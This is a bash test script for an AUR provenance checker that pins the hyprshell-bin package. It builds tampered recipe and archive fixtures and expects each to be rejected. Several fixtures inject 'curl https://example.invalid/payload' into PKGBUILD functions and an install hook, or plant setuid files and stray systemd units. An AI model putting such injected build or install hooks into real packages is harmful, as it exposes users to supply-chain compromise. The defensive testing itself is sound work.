#!/usr/bin/env bash
set -euo pipefail

repo_root=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
helper=$repo_root/scripts/lib/aur-provenance
work=$(mktemp -d)
trap 'rm -rf -- "$work"' EXIT
rejection_index=0
canonical_lock=$work/hyprshell-legacy-lock.json

cat >"$canonical_lock" <<'JSON'
{
  "schema": 1,
  "reviewed_at": "2026-08-11",
  "protected_packages": [
    {
      "pkgbase": "hyprshell-bin",
      "pkgname": "hyprshell-bin",
      "architecture": "x86_64",
      "pkgver": "4.10.8",
      "pkgrel": "1",
      "aur": {
        "url": "https://aur.archlinux.org/hyprshell-bin.git",
        "commit": "319a946f47d927a0cecb5b1e56e4d0add3b1846e"
      },
      "tree": {
        ".SRCINFO": "8bbbc7f409e23fb8cecca0ae5dcc3e8b73d0df09a6cc9d05fbc645c8b168bafc",
        "PKGBUILD": "1d05131bcf287a4767212fc1a6082bfe78dc33175c18c407f8224cafa7cba4a5"
      },
      "install_script": null,
      "sources": [
        {
          "architecture": "aarch64",
          "url": "https://github.com/H3rmt/hyprshell/releases/download/v4.10.8/hyprshell-4.10.8-aarch64.tar.zst",
          "sha256": "f49bef35a13d8effc4ce0033f00ee72390dc4d40c5d5b94b19df59fe45d652b7"
        },
        {
          "architecture": "x86_64",
          "url": "https://github.com/H3rmt/hyprshell/releases/download/v4.10.8/hyprshell-4.10.8-x86_64.tar.zst",
          "sha256": "eb0fd873fe8dbf43f7d4acac2a83f99b3ece40f575b937716fc0a32acf8593de"
        }
      ],
      "upstream_release": {
        "api_url": "https://api.github.com/repos/H3rmt/hyprshell/releases/latest",
        "id": 337573491,
        "tag": "v4.10.8",
        "draft": false,
        "prerelease": false
      },
      "archive_policy": {
        "system_units": [],
        "user_units": ["usr/lib/systemd/user/hyprshell.service"],
        "pacman_hooks": [],
        "modules_load": []
      }
    }
  ]
}
JSON

fail() {
  printf 'AUR provenance test failed: %s\n' "$*" >&2
  exit 1
}

expect_rejected() {
  local label=$1 expected=$2 output
  shift 2
  rejection_index=$((rejection_index + 1))
  output=$work/rejection-$rejection_index.out
  if "$@" >"$output" 2>&1; then
    fail "$label was accepted"
  fi
  if ! grep -Eqi -- "$expected" "$output"; then
    printf '%s\n' "--- unexpected rejection for $label ---" >&2
    sed -n '1,120p' "$output" >&2
    fail "$label did not report the expected policy failure"
  fi
}

refresh_lock() {
  local fixture=$1 output=$2
  /usr/bin/python - "$canonical_lock" "$fixture" "$output" <<'PY'
from hashlib import sha256
import json
from pathlib import Path
import sys

source = Path(sys.argv[1])
fixture = Path(sys.argv[2])
output = Path(sys.argv[3])
lock = json.loads(source.read_text(encoding="utf-8"))
tree = {}
for path in sorted(item for item in fixture.rglob("*") if item.is_file()):
    tree[path.relative_to(fixture).as_posix()] = sha256(path.read_bytes()).hexdigest()
lock["protected_packages"][0]["tree"] = tree
output.write_text(json.dumps(lock, indent=2) + "\n", encoding="utf-8")
PY
}

set_install_lock() {
  local lock=$1 fixture=$2
  /usr/bin/python - "$lock" "$fixture" <<'PY'
from hashlib import sha256
import json
from pathlib import Path
import sys

path = Path(sys.argv[1])
install = Path(sys.argv[2]) / "hyprshell.install"
lock = json.loads(path.read_text(encoding="utf-8"))
lock["protected_packages"][0]["install_script"] = {
    "path": "hyprshell.install",
    "sha256": sha256(install.read_bytes()).hexdigest(),
}
path.write_text(json.dumps(lock, indent=2) + "\n", encoding="utf-8")
PY
}

base=$work/base
mkdir -- "$base"
cat >"$base/.SRCINFO" <<'SRCINFO'
pkgbase = hyprshell-bin
	pkgdesc = A modern GTK4-based window switcher and application launcher for Hyprland (binary release)
	pkgver = 4.10.8
	pkgrel = 1
	url = https://github.com/h3rmt/hyprshell/
	arch = x86_64
	arch = aarch64
	license = MIT
	depends = hyprland
	depends = gtk4-layer-shell
	depends = gtk4
	depends = libadwaita
	depends = zstd
	optdepends = org.freedesktop.secrets: Store clipboard encryption in the keyring
	provides = hyprshell
	conflicts = hyprshell
	source_x86_64 = https://github.com/H3rmt/hyprshell/releases/download/v4.10.8/hyprshell-4.10.8-x86_64.tar.zst
	sha256sums_x86_64 = eb0fd873fe8dbf43f7d4acac2a83f99b3ece40f575b937716fc0a32acf8593de
	source_aarch64 = https://github.com/H3rmt/hyprshell/releases/download/v4.10.8/hyprshell-4.10.8-aarch64.tar.zst
	sha256sums_aarch64 = f49bef35a13d8effc4ce0033f00ee72390dc4d40c5d5b94b19df59fe45d652b7

pkgname = hyprshell-bin
SRCINFO
cat >"$base/PKGBUILD" <<'PKGBUILD'
pkgname=hyprshell-bin
# x-release-please-start-version
pkgver=4.10.8
# x-release-please-end
pkgrel=1
pkgdesc="A modern GTK4-based window switcher and application launcher for Hyprland (binary release)"
arch=('x86_64' 'aarch64')
conflicts=('hyprshell')
provides=('hyprshell')
url="https://github.com/h3rmt/hyprshell/"
license=("MIT")
optdepends=('org.freedesktop.secrets: Store clipboard encryption in the keyring')
depends=('hyprland' 'gtk4-layer-shell' 'gtk4' 'libadwaita' 'zstd')
source_x86_64=("https://github.com/H3rmt/hyprshell/releases/download/v$pkgver/hyprshell-$pkgver-x86_64.tar.zst")
source_aarch64=("https://github.com/H3rmt/hyprshell/releases/download/v$pkgver/hyprshell-$pkgver-aarch64.tar.zst")

package() {
    install -Dm755 "hyprshell"                  "$pkgdir/usr/bin/hyprshell"
    install -Dm644 "LICENSE"                    "$pkgdir/usr/share/licenses/hyprshell/LICENSE"
    install -Dm644 "README.md"                  "$pkgdir/usr/share/doc/hyprshell/README.md"
    install -Dm644 "CONFIGURE.md"               "$pkgdir/usr/share/doc/hyprshell/CONFIGURE.md"
    install -Dm644 "DEBUG.md"                   "$pkgdir/usr/share/doc/hyprshell/DEBUG.md"
    install -Dm644 "hyprshell.service"          "$pkgdir/usr/lib/systemd/user/hyprshell.service"
    install -Dm644 "hyprshell-settings.png"     "$pkgdir/usr/share/pixmaps/hyprshell.png"
    install -Dm644 "hyprshell-settings.desktop" "$pkgdir/usr/share/applications/hyprshell-settings.desktop"

    mkdir "$pkgdir/usr/share/hyprshell"
    tar -xvf "usr-share.tar" -C "$pkgdir/usr/share/hyprshell" | tee >(wc -l | xargs -I {} echo "Extracted {} files to $pkgdir/usr/share/hyprshell") > /dev/null

    "$pkgdir/usr/bin/hyprshell" completions bash -p  "$pkgdir/usr/share/bash-completion/completions"
    "$pkgdir/usr/bin/hyprshell" completions fish -p  "$pkgdir/usr/share/fish/vendor_completions.d"
    "$pkgdir/usr/bin/hyprshell" completions zsh -p   "$pkgdir/usr/share/zsh/site-functions"
}
sha256sums_x86_64=('eb0fd873fe8dbf43f7d4acac2a83f99b3ece40f575b937716fc0a32acf8593de')
sha256sums_aarch64=('f49bef35a13d8effc4ce0033f00ee72390dc4d40c5d5b94b19df59fe45d652b7')
PKGBUILD

[[ $(sha256sum <"$base/.SRCINFO" | awk '{print $1}') == 8bbbc7f409e23fb8cecca0ae5dcc3e8b73d0df09a6cc9d05fbc645c8b168bafc ]] ||
  fail 'the offline .SRCINFO fixture drifted from the reviewed AUR tree'
[[ $(sha256sum <"$base/PKGBUILD" | awk '{print $1}') == 1d05131bcf287a4767212fc1a6082bfe78dc33175c18c407f8224cafa7cba4a5 ]] ||
  fail 'the offline PKGBUILD fixture drifted from the reviewed AUR tree'

"$helper" validate \
  --lock "$canonical_lock" \
  >/dev/null
"$helper" verify-recipe \
  --lock "$canonical_lock" \
  --package hyprshell-bin \
  --recipe-dir "$base" >/dev/null

/usr/bin/python - "$helper" "$canonical_lock" "$work" <<'PY' || fail 'pinned AUR fetch retries did not preserve the fail-closed checkout contract'
import json
import os
from pathlib import Path
import runpy
import sys

module = runpy.run_path(sys.argv[1], run_name="aur_provenance_retry_test")
package = json.loads(Path(sys.argv[2]).read_text(encoding="utf-8"))[
    "protected_packages"
][0]
work = Path(sys.argv[3])
checkout_pinned = module["checkout_pinned"]
provenance_error = module["ProvenanceError"]
globals_ = checkout_pinned.__globals__
globals_["time"].sleep = lambda _seconds: None


def exercise_fetch(*, failures: int, attempts: int, mismatched_head: bool = False):
    calls: list[str] = []
    verified: list[Path] = []

    def fake_run_checked(
        _command,
        *,
        cwd=None,
        capture=False,
        env=None,
        label=None,
    ):
        del cwd, capture, env
        assert label is not None
        calls.append(label)
        fetches = calls.count("pinned AUR commit fetch")
        if label == "pinned AUR commit fetch" and fetches <= failures:
            raise provenance_error(f"transient fetch failure {fetches}")
        if label == "AUR commit identity query":
            return "0" * 40 if mismatched_head else package["aur"]["commit"]
        if label == "AUR tree query":
            return "\0".join(sorted(package["tree"])) + "\0"
        return ""

    globals_["run_checked"] = fake_run_checked
    globals_["verify_recipe"] = lambda _package, destination: verified.append(
        destination
    )
    os.environ["AUR_PROVENANCE_FETCH_MAX_ATTEMPTS"] = str(attempts)
    os.environ["AUR_PROVENANCE_FETCH_RETRY_DELAY_SECONDS"] = "0"
    return calls, verified


calls, verified = exercise_fetch(failures=2, attempts=3)
success_destination = work / "fetch-eventual-success"
checkout_pinned(package, success_destination)
assert calls.count("pinned AUR commit fetch") == 3
assert calls.count("pinned AUR commit checkout") == 1
assert calls.count("AUR commit identity query") == 1
assert calls.count("AUR tree query") == 1
assert verified == [success_destination]

calls, verified = exercise_fetch(failures=99, attempts=2)
try:
    checkout_pinned(package, work / "fetch-exhausted")
except provenance_error as error:
    assert str(error) == "transient fetch failure 2"
else:
    raise AssertionError("an exhausted pinned fetch retry budget was accepted")
assert calls.count("pinned AUR commit fetch") == 2
assert "pinned AUR commit checkout" not in calls
assert "AUR commit identity query" not in calls
assert "AUR tree query" not in calls
assert not verified

calls, verified = exercise_fetch(failures=0, attempts=3, mismatched_head=True)
try:
    checkout_pinned(package, work / "fetch-mismatched-head")
except provenance_error as error:
    assert "checked-out AUR commit differs from the lock" in str(error)
else:
    raise AssertionError("a mismatched checked-out commit was accepted")
assert calls.count("pinned AUR commit fetch") == 1
assert calls.count("AUR commit identity query") == 1
assert "AUR tree query" not in calls
assert not verified
PY

makepkg_workspace=$work/makepkg-workspace
mkdir -p -- \
  "$makepkg_workspace/packages" \
  "$makepkg_workspace/sources" \
  "$makepkg_workspace/build"
cp -- /etc/makepkg.conf "$makepkg_workspace/makepkg.conf"
/usr/bin/python - "$helper" "$makepkg_workspace/makepkg.conf" \
  "$makepkg_workspace" <<'PY'
from pathlib import Path
import runpy
import sys

module = runpy.run_path(sys.argv[1], run_name="aur_provenance_test")
module["append_makepkg_policy"](Path(sys.argv[2]), "sudo", Path(sys.argv[3]))
PY
mapfile -t protected_package_paths < <(
  cd "$base"
  makepkg --config "$makepkg_workspace/makepkg.conf" --packagelist
)
[[ ${#protected_package_paths[@]} -eq 1 ]] ||
  fail 'the protected makepkg policy did not disable generated debug splitting'
[[ $(basename -- "${protected_package_paths[0]}") == hyprshell-bin-4.10.8-1-x86_64.pkg.tar.zst ]] ||
  fail 'the protected makepkg policy did not select exactly the main local archive'

/usr/bin/python - "$helper" <<'PY' || fail 'a same-version protected package could bypass reviewed archive replacement'
from pathlib import Path
import runpy
import sys

module = runpy.run_path(sys.argv[1], run_name="aur_provenance_install_command_test")
archive = Path("/var/tmp/hyprshell-bin-4.10.8-1-x86_64.pkg.tar.zst")
command = module["protected_archive_install_command"]("sudo-wrapper", archive)
assert command == [
    "sudo-wrapper",
    "/usr/bin/pacman",
    "--noconfirm",
    "--noscriptlet",
    "-U",
    "--",
    str(archive),
]
assert "--needed" not in command
PY

/usr/bin/python - "$canonical_lock" <<'PY' || fail 'the lock does not cover both recipe sources exactly'
import json
from pathlib import Path
import sys

package = json.loads(Path(sys.argv[1]).read_text(encoding="utf-8"))["protected_packages"][0]
assert package["pkgbase"] == "hyprshell-bin"
assert {source["architecture"] for source in package["sources"]} == {"aarch64", "x86_64"}
assert all("slim" not in source["url"] for source in package["sources"])
PY

url_fixture=$work/source-url
cp -a -- "$base" "$url_fixture"
sed -i \
  's#source_x86_64 = https://github.com/H3rmt/#source_x86_64 = https://example.invalid/#' \
  "$url_fixture/.SRCINFO"
refresh_lock "$url_fixture" "$work/source-url.json"
expect_rejected 'a changed source URL' 'source URL|HTTPS URL' \
  "$helper" verify-recipe --lock "$work/source-url.json" \
  --package hyprshell-bin --recipe-dir "$url_fixture"

checksum_fixture=$work/checksum
cp -a -- "$base" "$checksum_fixture"
sed -i \
  's/eb0fd873fe8dbf43f7d4acac2a83f99b3ece40f575b937716fc0a32acf8593de/0000000000000000000000000000000000000000000000000000000000000000/' \
  "$checksum_fixture/.SRCINFO"
refresh_lock "$checksum_fixture" "$work/checksum.json"
expect_rejected 'a changed source checksum' 'checksum.*lock' \
  "$helper" verify-recipe --lock "$work/checksum.json" \
  --package hyprshell-bin --recipe-dir "$checksum_fixture"

skip_fixture=$work/skip
cp -a -- "$base" "$skip_fixture"
sed -i \
  's/sha256sums_x86_64 = .*/sha256sums_x86_64 = SKIP/' \
  "$skip_fixture/.SRCINFO"
refresh_lock "$skip_fixture" "$work/skip.json"
expect_rejected 'a SKIP checksum' 'uses SKIP' \
  "$helper" verify-recipe --lock "$work/skip.json" \
  --package hyprshell-bin --recipe-dir "$skip_fixture"

vcs_fixture=$work/vcs
cp -a -- "$base" "$vcs_fixture"
sed -i \
  's|source_x86_64 = .*|source_x86_64 = git+https://github.com/H3rmt/hyprshell.git#tag=v4.10.8|' \
  "$vcs_fixture/.SRCINFO"
refresh_lock "$vcs_fixture" "$work/vcs.json"
expect_rejected 'a VCS source' 'VCS source' \
  "$helper" verify-recipe --lock "$work/vcs.json" \
  --package hyprshell-bin --recipe-dir "$vcs_fixture"

extra_source_fixture=$work/extra-source
cp -a -- "$base" "$extra_source_fixture"
sed -i \
  '/source_aarch64 =/a\	source = https://example.invalid/unreviewed.tar.zst\n\tsha256sums = 1111111111111111111111111111111111111111111111111111111111111111' \
  "$extra_source_fixture/.SRCINFO"
refresh_lock "$extra_source_fixture" "$work/extra-source.json"
expect_rejected 'an extra remote source' 'source architecture set' \
  "$helper" verify-recipe --lock "$work/extra-source.json" \
  --package hyprshell-bin --recipe-dir "$extra_source_fixture"

added_install_fixture=$work/added-install
cp -a -- "$base" "$added_install_fixture"
sed -i '/pkgrel = 1/a\	install = hyprshell.install' "$added_install_fixture/.SRCINFO"
sed -i '/^pkgrel=1/a install=hyprshell.install' "$added_install_fixture/PKGBUILD"
printf '#!/bin/sh\npost_install() { :; }\n' >"$added_install_fixture/hyprshell.install"
refresh_lock "$added_install_fixture" "$work/added-install.json"
expect_rejected 'an added install script' 'unexpectedly declares an install script' \
  "$helper" verify-recipe --lock "$work/added-install.json" \
  --package hyprshell-bin --recipe-dir "$added_install_fixture"

reviewed_install_fixture=$work/reviewed-install
cp -a -- "$added_install_fixture" "$reviewed_install_fixture"
refresh_lock "$reviewed_install_fixture" "$work/reviewed-install.json"
set_install_lock "$work/reviewed-install.json" "$reviewed_install_fixture"
"$helper" verify-recipe --lock "$work/reviewed-install.json" \
  --package hyprshell-bin --recipe-dir "$reviewed_install_fixture" >/dev/null
printf 'post_upgrade() { curl https://example.invalid; }\n' \
  >>"$reviewed_install_fixture/hyprshell.install"
expect_rejected 'a mutated reviewed install script' 'hash differs' \
  "$helper" verify-recipe --lock "$work/reviewed-install.json" \
  --package hyprshell-bin --recipe-dir "$reviewed_install_fixture"
refresh_lock "$reviewed_install_fixture" "$work/network-install.json"
set_install_lock "$work/network-install.json" "$reviewed_install_fixture"
expect_rejected 'a network command in an install script' 'network command curl' \
  "$helper" verify-recipe --lock "$work/network-install.json" \
  --package hyprshell-bin --recipe-dir "$reviewed_install_fixture"

network_recipe_fixture=$work/network-recipe
cp -a -- "$base" "$network_recipe_fixture"
sed -i '/^package() {/a\    curl https://example.invalid/payload' \
  "$network_recipe_fixture/PKGBUILD"
refresh_lock "$network_recipe_fixture" "$work/network-recipe.json"
expect_rejected 'a network command in package()' 'network command curl' \
  "$helper" verify-recipe --lock "$work/network-recipe.json" \
  --package hyprshell-bin --recipe-dir "$network_recipe_fixture"

for function_name in check pkgver; do
  network_function_fixture=$work/network-$function_name
  cp -a -- "$base" "$network_function_fixture"
  printf '\n%s() {\n    curl https://example.invalid/payload\n}\n' \
    "$function_name" >>"$network_function_fixture/PKGBUILD"
  refresh_lock \
    "$network_function_fixture" "$work/network-$function_name.json"
  expect_rejected \
    "a network command in $function_name()" 'network command curl' \
    "$helper" verify-recipe --lock "$work/network-$function_name.json" \
    --package hyprshell-bin --recipe-dir "$network_function_fixture"
done

version_fixture=$work/version
cp -a -- "$base" "$version_fixture"
sed -i 's/pkgver = 4\.10\.8/pkgver = 4.10.9/' "$version_fixture/.SRCINFO"
sed -i 's/^pkgver=4\.10\.8/pkgver=4.10.9/' "$version_fixture/PKGBUILD"
refresh_lock "$version_fixture" "$work/version.json"
expect_rejected 'a package version mismatch' 'pkgver does not match' \
  "$helper" verify-recipe --lock "$work/version.json" \
  --package hyprshell-bin --recipe-dir "$version_fixture"

/usr/bin/python - "$canonical_lock" "$work/prerelease.json" <<'PY'
import json
from pathlib import Path
import sys

lock = json.loads(Path(sys.argv[1]).read_text(encoding="utf-8"))
package = lock["protected_packages"][0]
package["pkgver"] = "4.10.8-rc1"
package["upstream_release"]["tag"] = "v4.10.8-rc1"
package["upstream_release"]["prerelease"] = True
Path(sys.argv[2]).write_text(json.dumps(lock, indent=2) + "\n", encoding="utf-8")
PY
expect_rejected 'a prerelease lock' 'stable release|stable and published' \
  "$helper" validate --lock "$work/prerelease.json"

archive_root=$work/archive-root
mkdir -p -- "$archive_root/usr/lib/systemd/user"
cat >"$archive_root/.PKGINFO" <<'PKGINFO'
pkgname = hyprshell-bin
pkgver = 4.10.8-1
arch = x86_64
PKGINFO
printf '[Unit]\nDescription=Hyprshell\n' \
  >"$archive_root/usr/lib/systemd/user/hyprshell.service"
tar -C "$archive_root" --format=pax -cf "$work/safe.pkg.tar" .
"$helper" verify-archive --lock "$canonical_lock" \
  --package hyprshell-bin --archive "$work/safe.pkg.tar" >/dev/null

install_archive_root=$work/archive-install
cp -a -- "$archive_root" "$install_archive_root"
printf 'post_install() { :; }\n' >"$install_archive_root/.INSTALL"
tar -C "$install_archive_root" --format=pax -cf "$work/install.pkg.tar" .
expect_rejected 'an unexpected archive install script' 'unexpectedly contains .INSTALL' \
  "$helper" verify-archive --lock "$canonical_lock" \
  --package hyprshell-bin --archive "$work/install.pkg.tar"

declare -A unexpected_archive_paths=(
  [home_user_unit]='home/alice/.config/systemd/user/evil.service'
  [local_modules_load]='usr/local/lib/modules-load.d/evil.conf'
  [local_user_unit]='usr/local/share/systemd/user/evil.service'
  [system_unit]='usr/lib/systemd/system/evil.service'
  [user_unit]='usr/lib/systemd/user/evil.service'
  [pacman_hook]='usr/share/libalpm/hooks/evil.hook'
  [modules_load]='usr/lib/modules-load.d/evil.conf'
  [runtime_user_unit]='run/user/1000/systemd/user/evil.service'
  [xdg_user_unit]='etc/xdg/systemd/user/evil.service'
)
for label in "${!unexpected_archive_paths[@]}"; do
  root=$work/archive-$label
  cp -a -- "$archive_root" "$root"
  path=${unexpected_archive_paths[$label]}
  mkdir -p -- "$root/$(dirname -- "$path")"
  printf 'unexpected\n' >"$root/$path"
  tar -C "$root" --format=pax -cf "$work/$label.pkg.tar" .
  expect_rejected "an unexpected $label" \
    'system_units|user_units|pacman_hooks|modules_load' \
    "$helper" verify-archive --lock "$canonical_lock" \
    --package hyprshell-bin --archive "$work/$label.pkg.tar"
done

setid_root=$work/archive-setid
cp -a -- "$archive_root" "$setid_root"
mkdir -p -- "$setid_root/usr/bin"
printf 'binary\n' >"$setid_root/usr/bin/unsafe"
chmod 4755 "$setid_root/usr/bin/unsafe"
tar -C "$setid_root" --format=pax -cf "$work/setid.pkg.tar" .
expect_rejected 'a set-ID archive member' 'set-ID member' \
  "$helper" verify-archive --lock "$canonical_lock" \
  --package hyprshell-bin --archive "$work/setid.pkg.tar"

unit_symlink_root=$work/archive-unit-symlink
cp -a -- "$archive_root" "$unit_symlink_root"
mkdir -p -- "$unit_symlink_root/usr/local/lib/systemd"
ln -s -- /home/alice/units "$unit_symlink_root/usr/local/lib/systemd/system"
tar -C "$unit_symlink_root" --format=pax -cf "$work/unit-symlink.pkg.tar" .
expect_rejected 'a sensitive unit-root symlink' 'system_units' \
  "$helper" verify-archive --lock "$canonical_lock" \
  --package hyprshell-bin --archive "$work/unit-symlink.pkg.tar"

unit_ancestor_root=$work/archive-unit-ancestor
cp -a -- "$archive_root" "$unit_ancestor_root"
mkdir -p -- "$unit_ancestor_root/usr/local/lib"
ln -s -- /home/alice/systemd "$unit_ancestor_root/usr/local/lib/systemd"
tar -C "$unit_ancestor_root" --format=pax -cf "$work/unit-ancestor.pkg.tar" .
expect_rejected 'a sensitive unit-root ancestor symlink' 'system_units|user_units' \
  "$helper" verify-archive --lock "$canonical_lock" \
  --package hyprshell-bin --archive "$work/unit-ancestor.pkg.tar"

mkdir -- "$work/bin" "$work/installed"
owned_file=$work/installed/hyprshell
printf 'binary\n' >"$owned_file"
cat >"$work/bin/pacman" <<'PACMAN'
#!/usr/bin/env bash
set -eu
case ${1:-} in
  -Q)
    printf 'hyprshell-bin 4.10.8-1\n'
    ;;
  -Qlq)
    printf '%s\n' "$AUR_OWNED_FILE"
    ;;
  *)
    exit 2
    ;;
esac
PACMAN
cat >"$work/bin/getcap" <<'GETCAP'
#!/usr/bin/env bash
set -eu
if [[ -n ${AUR_CAPABILITY_OUTPUT:-} ]]; then
  printf '%s\n' "$AUR_CAPABILITY_OUTPUT"
fi
GETCAP
cat >"$work/bin/sudo-wrapper" <<'SUDO'
#!/usr/bin/env bash
set -eu
exec "$@"
SUDO
chmod +x "$work/bin/pacman" "$work/bin/getcap" "$work/bin/sudo-wrapper"
env AUR_OWNED_FILE="$owned_file" \
  "$helper" verify-installed --lock "$canonical_lock" \
  --package hyprshell-bin --pacman-command "$work/bin/pacman" \
  --getcap-command "$work/bin/getcap" >/dev/null
env AUR_OWNED_FILE="$owned_file" \
  "$helper" enforce-installed-safety \
  --package hyprshell-bin --version 4.10.8-1 \
  --sudo-command "$work/bin/sudo-wrapper" \
  --pacman-command "$work/bin/pacman" \
  --getcap-command "$work/bin/getcap" >/dev/null
expect_rejected 'an invalid generic package version' 'version is invalid' \
  "$helper" enforce-installed-safety \
  --package hyprshell-bin --version latest \
  --sudo-command "$work/bin/sudo-wrapper" \
  --pacman-command "$work/bin/pacman" \
  --getcap-command "$work/bin/getcap"
chmod 4755 "$owned_file"
expect_rejected 'an installed set-ID file' 'set-ID path' \
  env AUR_OWNED_FILE="$owned_file" \
  "$helper" verify-installed --lock "$canonical_lock" \
  --package hyprshell-bin --pacman-command "$work/bin/pacman" \
  --getcap-command "$work/bin/getcap"
env AUR_OWNED_FILE="$owned_file" /usr/bin/python - \
  "$helper" "$canonical_lock" "$work/bin/pacman" "$work/bin/getcap" \
  "$work/bin/sudo-wrapper" <<'PY'
from pathlib import Path
import runpy
import stat
import sys

module = runpy.run_path(sys.argv[1], run_name="aur_provenance_remediation_test")
assert module["capability_removal_command"]("sudo", ["/one", "/two"]) == [
    "sudo",
    "/usr/bin/setcap",
    "-r",
    "/one",
    "-r",
    "/two",
]
package = module["package_from_lock"](Path(sys.argv[2]), "hyprshell-bin")
try:
    module["verify_installed"](package, pacman=sys.argv[3], getcap=sys.argv[4])
except module["InstalledSafetyError"] as finding:
    try:
        module["neutralize_installed_attributes"](
            package,
            finding,
            sudo_command=sys.argv[5],
            pacman=sys.argv[3],
            getcap=sys.argv[4],
        )
    except module["ProvenanceError"] as error:
        assert "detected and removed" in str(error)
    else:
        raise AssertionError("remediated unsafe attributes did not reject installation")
else:
    raise AssertionError("set-ID test fixture was not detected")
mode = Path(__import__("os").environ["AUR_OWNED_FILE"]).stat().st_mode
assert not mode & (stat.S_ISUID | stat.S_ISGID)
PY
chmod 4755 "$owned_file"
expect_rejected 'generic installed safety remediation' 'detected and removed' \
  env AUR_OWNED_FILE="$owned_file" \
  "$helper" enforce-installed-safety \
  --package hyprshell-bin --version 4.10.8-1 \
  --sudo-command "$work/bin/sudo-wrapper" \
  --pacman-command "$work/bin/pacman" \
  --getcap-command "$work/bin/getcap"
[[ ! -u $owned_file && ! -g $owned_file ]] ||
  fail 'generic installed safety did not neutralize the set-ID bits'
expect_rejected 'an installed file capability' 'file capability' \
  env AUR_OWNED_FILE="$owned_file" \
  AUR_CAPABILITY_OUTPUT="$owned_file cap_net_admin=ep" \
  "$helper" verify-installed --lock "$canonical_lock" \
  --package hyprshell-bin --pacman-command "$work/bin/pacman" \
  --getcap-command "$work/bin/getcap"

printf 'AUR provenance tests passed.\n'
